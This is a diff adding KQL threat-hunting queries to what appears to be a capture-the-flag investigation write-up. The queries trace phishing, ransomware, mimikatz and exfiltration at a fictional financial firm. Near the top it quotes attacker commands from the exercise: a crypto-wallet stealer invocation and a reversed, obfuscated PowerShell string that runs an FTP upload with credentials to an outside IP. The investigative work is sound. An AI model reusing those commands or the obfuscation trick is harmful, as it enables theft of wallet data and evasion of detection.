@@ -75,16 +75,316 @@ So Robin WAS phished by Barry Shmelly's account!
 Let's recap. A threat actor 😈 compromised Barry Shmelly's account and logged into it from 143.38.175.105. Once the actor gained access to Barry's account, they used it to target 9 employees in a phishing 🎣 attack.
 
 
+crypto_stealer.exe --daily --input \\\\NetworkShare\\critical_infrastructure\\Crypto_Wallet_Storage_Locations\\ --output C:\\Users\\jasmith\\ToTheMoon\\
+
+( '\\nooMehToT\\htimsaj\\sresU\\:C htap-- 121.32.65.281 pi-- 12 trop-- "moc.laicnanifaredotpyrcne" mitciv-- 5DN4HruFF0ti3k4tll3wOTYRChcum2togU ssap-- htimsaj resu-- yliad-- exe.tneilc_ptf' -split '' | %{$_[0]}) -join ''
 
 
 
 
 
 
+Employees
+| count 
+
+Employees
+| where ip_addr == '10.10.0.216'
+
+Email
+| where recipient == 'nakia_acosta@encryptoderafinancial.com'
+| count 
+
+Email
+| where sender has "bitbingersbanking.net"
+| distinct sender
+| count 
+
+Employees
+| where name contains "Timothy Geffre"
+
+OutboundNetworkEvents
+| where src_ip =='10.10.1.73'
+| distinct url
+| count 
+
+PassiveDns
+| where domain contains "money"
+
+PassiveDns
+| where domain == "moneyppl.com"
+
+let karen_ips=
+Employees
+| where name has "Karen"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip in (karen_ips)
+| distinct url
+| count 
+
+let karen_username=
+Employees
+| where name has "Karen"
+| distinct username;
+AuthenticationEvents
+| where username in(karen_username)
+| count 
+
+Employees
+| where name contains "Barry"
+
+Email
+| where sender == 'barry_shmelly@encryptoderafinancial.com'
+| where timestamp between(datetime(2024-01-16) .. datetime(2024-01-17))
+
+Email
+| take 10
+
+let employess_that_receivedEmail =
+Email
+| where sender == 'barry_shmelly@encryptoderafinancial.com'
+| where timestamp between(datetime(2024-01-16) .. datetime(2024-01-17))
+| where subject == "I'm not coming in today. I'm sick of this place. We're all getting laid off anyway."
+|distinct recipient;
+Employees
+| where email_addr in(employess_that_receivedEmail)
+| distinct role
+
+let someone_gutcursed=
+Email
+| where sender == 'barry_shmelly@encryptoderafinancial.com'
+| where subject =='YOU ARE A GREEDY PIG!!!! WHAT IS WRONG WITH YOU?????'
+| distinct recipient;
+Employees
+| where email_addr in(someone_gutcursed)
+| distinct role
+
+OutboundNetworkEvents
+| where src_ip =='10.10.0.1'
+| where timestamp between(datetime(2023-12-26) .. datetime(2023-12-29))
+
+OutboundNetworkEvents
+| where src_ip =='10.10.0.1'
+| where timestamp between(datetime(2024-01-15) .. datetime(2024-01-16))
+
+InboundNetworkEvents
+| where src_ip =='10.10.0.1'
+
+OutboundNetworkEvents
+| where src_ip =='10.10.0.1'
+| where timestamp between(datetime(2024-01-15) .. datetime(2024-01-19))
+
+ProcessEvents
+| where hostname =='IGOY-DESKTOP'
+| where timestamp between(datetime(2024-01-15) .. datetime(2024-01-19))
+
+FileCreationEvents
+| where hostname =='IGOY-DESKTOP'
+
+FileCreationEvents
+| where filename == "YOU_GOT_CRYTOED_SO_GIMME_CRYPTO.txt"
+| sort by timestamp asc
+
+ProcessEvents
+| where hostname =='UL8R-MACHINE'
+| where process_commandline has '.umadbro'
+
+FileCreationEvents
+| where hostname =='UL8R-MACHINE'
+| where filename contains "files_go_byebye.exe"
+
+ProcessEvents
+| where hostname == "UL8R-MACHINE"
+| where timestamp between (datetime("2024-02-16") .. datetime("2024-02-18"))
+//| where process_name has 'powershell'
+
+ProcessEvents
+| where process_commandline has 'systeminfo'
+
+ProcessEvents
+| where hostname =='41QI-LAPTOP'
+| where process_commandline has 'nltest /dclist'
+
+ProcessEvents
+| where hostname =='41QI-LAPTOP'
+| where process_name has '.xlsx.exe'
+
+FileCreationEvents
+| where hostname =='41QI-LAPTOP'
+//| where filename contains ".xlsx.exe"
+| where timestamp between (datetime("2024-01-01") .. datetime("2024-02-02"))
+
+FileCreationEvents
+| where  filename =="screenconnect_client.exe"
+
+Email
+| where link has '.xlsx.exe'
+
+Employees
+| where email_addr == 'barry_shmelly@encryptoderafinancial.com'
 
 
+Email
+| where sender == "barry_shmelly@encryptoderafinancial.com"
+| where timestamp between (datetime("2024-02-01") .. datetime("2024-02-10"))
+
+AuthenticationEvents
+| where username =='bashmelly'
+
+AuthenticationEvents
+| where src_ip =='143.38.175.105'
+
+let hosts=
+ProcessEvents
+| where process_commandline has "systeminfo"
+| distinct hostname;
+AuthenticationEvents
+| where hostname in (hosts)
+| summarize dcount(hostname) by src_ip
+| order by dcount_hostname desc
+
+ProcessEvents
+| where process_commandline has "systeminfo"
+| distinct hostname;
+
+Employees
+| where ip_addr =='10.10.0.138'
+
+AuthenticationEvents
+| where src_ip =='10.10.0.138' and result has "Successful Login"
+| where hostname has "server"
+
+AuthenticationEvents
+| where username == 'lihenry_domain_admin'
+
+ProcessEvents
+| where process_commandline has 'mimikatz'
+
+Employees
+| where hostname =='GJ95-LAPTOP'
+
+Employees
+| where username =="sekurlsa"
+
+Email
+| where recipient =="valerie_orozco@encryptoderafinancial.com"
+
+Employees
+| where email_addr =='valerie_orozco@encryptoderafinancial.com'
+
+OutboundNetworkEvents
+| where src_ip =='10.10.0.18'
 
 
+AuthenticationEvents
+| where hostname =='GJ95-LAPTOP'
+| where src_ip !contains "10.10.0.18" and result has "Successful Login"
+|distinct  username
+//|count 
+
+AuthenticationEvents
+| where username =='systadmi_local_admin'
+| distinct hostname
+| count
+
+let host=
+FileCreationEvents
+| where filename has "screenconnect"
+| distinct hostname;
+AuthenticationEvents
+| where hostname in (host)
+| where username has 'systadmi'
+| where result has "Successful"
+| join (
+    Employees
+    | project ip_addr, role, email_addr, name
+) on $left.src_ip==$right.ip_addr
+| project  SourceIpName =name, a = 'who is a', SourceUpserRole=role, b = 'logged onto', hostname, c = 'using', username, d = 'at', timestamp
+
+
+AuthenticationEvents
+| where username =='systadmi_local_admin'
+
+FileCreationEvents
+| where filename has "screenconnect"
+//| distinct hostname;
+
+let host=
+FileCreationEvents
+| where filename has "screenconnect"
+| distinct hostname;
+AuthenticationEvents
+| where hostname in (host)
+| where username has 'systadmi'
+| where result has "Successful"
+
+Employees
+| where name has 'Robin'
+
+AuthenticationEvents
+| where username=='rokirby' and result has "Successful Login"
+
+
+Employees
+| where name has 'Barry'
+
+Email
+| where recipient =='robin_kirby@encryptoderafinancial.com'
+| where sender =='barry_shmelly@encryptoderafinancial.com'
+
+NetworkFlow
+| where timestamp between (datetime("2024-02-05") .. datetime("2024-02-06"))
+|project src_ip, bytes
+| where src_ip =='10.10.0.2'
+| summarize by bytes
+
+NetworkFlow
+| where timestamp between (datetime("2024-02-05") .. datetime("2024-02-06"))
+|project src_ip, bytes, dest_ip
+| summarize TotalBytesReceived = sum(bytes) by dest_ip
+| sort by TotalBytesReceived desc
+
+
+NetworkFlow
+| where dest_ip =='182.56.23.121'
+| sort by timestamp asc
+| distinct timestamp
+| count 
+//| where timestamp between (datetime("2024-02-05") .. datetime("2024-02-06"))
+
+NetworkFlow
+| where dest_ip =='182.56.23.121'
+| summarize TotalBytesReceived = sum(bytes) by dest_ip
+
+NetworkFlow
+| where dest_ip =='182.56.23.121'
+| distinct src_ip
+//|count 
+
+Employees
+| where ip_addr=='10.10.0.2'
+
+InboundNetworkEvents
+| where src_ip =='10.10.0.2'
+
+Email
+| where recipient =='jane_smith@encryptoderafinancial.com'
+
+OutboundNetworkEvents
+| where src_ip =='10.10.0.2'
+| where timestamp between (datetime("2024-01-21") .. datetime("2024-01-23"))
+
+//crypto_stealer.exe
+
+FileCreationEvents
+| where hostname =='GOTI-LAPTOP'
+//| where filename contains "crypto_stealer.exe"
+
+ProcessEvents
+| where hostname =='GOTI-LAPTOP'
+| where timestamp between (datetime("2024-01-20T13:03:23.000Z") .. datetime("2024-01-22T13:03:23.000Z"))
+
+| where process_name contains "crypto_stealer.exe"
 
 
 
